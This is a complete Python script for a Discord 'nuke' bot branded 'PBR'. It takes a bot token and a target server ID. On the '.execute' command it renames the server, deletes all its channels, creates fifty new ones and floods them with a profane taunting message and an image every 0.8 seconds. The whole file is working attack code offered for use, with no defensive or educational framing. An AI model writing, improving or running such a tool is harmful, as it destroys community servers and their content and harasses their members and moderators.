import discord
from discord.ext import commands, tasks
import asyncio
import sys
import os
import time
from colorama import Fore, Style, init

init(autoreset=True)

DARK_RED_ART = Fore.RED 
BRIGHT_RED_TEXT = Fore.RED + Style.BRIGHT

ASCII_ART = r"""
 ██▓███   ▄▄▄▄    ██▀███      ███▄    █  █    ██  ██ ▄█▀▓█████    ▄▄▄█████▓ ▒█████    ▒█████    ██▓   
▓██░  ██▒▓█████▄ ▓██ ▒ ██▒    ██ ▀█    █  ██  ▓██▒ ██▄█▒ ▓█   ▀    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒   
▓██░ ██▓▒▒██▒ ▄██▓██ ░▄█ ▒    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░   
▒██▄█▓▒ ▒▒██░█▀  ▒██▀▀█▄      ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░   
▒██▒ ░  ░░▓█  ▀█▓░██▓ ▒██▒    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
▒▓▒░ ░  ░░▒▓███▀▒░ ▒▓ ░▒▓░    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░     ▒ ░░    ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░▒ ░     ▒░▒    ░   ░▒ ░ ▒░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░       ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░░       ░    ░   ░░   ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░         ░       ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░  
           ░          ░                  ░   ░      ░  ░      ░  ░                ░ ░      ░ ░      ░  ░
                ░                                                                                     
"""

for line in ASCII_ART.splitlines():
    print(f"{DARK_RED_ART}{line}")
    time.sleep(0.08)

TOKEN = input(f"{BRIGHT_RED_TEXT}Enter Bot Token: {Style.RESET_ALL}").strip()

APPLICATION_ID = None
use_app_id = input(f"{BRIGHT_RED_TEXT}Do you want to use an Application ID? (y/n): {Style.RESET_ALL}").lower()
if use_app_id == 'y':
    app_id_input = input(f"{BRIGHT_RED_TEXT}Enter Application ID: {Style.RESET_ALL}").strip()
    try:
        APPLICATION_ID = int(app_id_input)
    except ValueError:
        print(f"{BRIGHT_RED_TEXT}Invalid ID. Proceeding without Application ID.")

GUILD_ID_INPUT = input(f"{BRIGHT_RED_TEXT}Enter Target Server ID: {Style.RESET_ALL}").strip()
IMAGE_PATH = input(f"{BRIGHT_RED_TEXT}Enter FULL path to image (.png/.jpg): {Style.RESET_ALL}").strip().replace('"', '')

DEFAULT_MSG = "DISCORD SERVER FUCKED BY PBR. WHAT YOU GONNA DO MODERATORS? YALL THINK PBR IS SLOW? WE SPREAD WE ARE HUMANS WE NUKE WE DESTROY WE MAKE MODS CRY"
custom_msg_choice = input(f"{BRIGHT_RED_TEXT}Do you want to use a custom nuke message? (y/n): {Style.RESET_ALL}").lower()
if custom_msg_choice == 'y':
    NUKE_MESSAGE = input(f"{BRIGHT_RED_TEXT}Enter custom nuke message: {Style.RESET_ALL}").strip()
else:
    NUKE_MESSAGE = DEFAULT_MSG

if not os.path.isfile(IMAGE_PATH):
    print(f"{BRIGHT_RED_TEXT}ERROR: File not found at {IMAGE_PATH}")
    sys.exit()

try:
    TARGET_GUILD_ID = int(GUILD_ID_INPUT)
except ValueError:
    print(f"{BRIGHT_RED_TEXT}Invalid Server ID format.")
    sys.exit()

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True 

bot = commands.Bot(command_prefix=".", intents=intents, application_id=APPLICATION_ID)
target_channels = []

@tasks.loop(seconds=0.8)
async def aggressive_spam():
    if not target_channels:
        return
        
    tasks_list = []
    for channel in target_channels:
        try:
            with open(IMAGE_PATH, "rb") as f:
                file_to_send = discord.File(f)
                tasks_list.append(channel.send(content=NUKE_MESSAGE, file=file_to_send))
        except:
            continue
    
    await asyncio.gather(*tasks_list, return_exceptions=True)

@bot.event
async def on_ready():
    print(f"\n{BRIGHT_RED_TEXT}[!] Bot Online: {bot.user.name}")
    print(f"{BRIGHT_RED_TEXT}[!] Message Set: {NUKE_MESSAGE[:40]}...")
    print(f"{BRIGHT_RED_TEXT}[!] Target Image: {IMAGE_PATH}")
    print(f"{BRIGHT_RED_TEXT}" + "-" * 30)
    print(f"{Style.BRIGHT}Type '.execute' in the target server to begin.")

@bot.command()
async def execute(ctx):
    if ctx.guild.id != TARGET_GUILD_ID:
        return

    print(f"{BRIGHT_RED_TEXT}!!! FUCKING SERVER ON: {ctx.guild.name} !!!")

    try:
        await ctx.guild.edit(name="PBR NUKED/FUCKED BY PBR")
    except:
        pass

    print(f"{BRIGHT_RED_TEXT}Clearing channels...")
    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    print(f"{BRIGHT_RED_TEXT}Generating 50 channels...")
    create_tasks = [ctx.guild.create_text_channel(name="pbr-nuked") for _ in range(50)]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
    
    for ch in new_channels:
        if isinstance(ch, discord.TextChannel):
            target_channels.append(ch)

    if not aggressive_spam.is_running():
        aggressive_spam.start()

try:
    bot.run(TOKEN)
except Exception as e:
    print(f"{BRIGHT_RED_TEXT}System Error: {e}")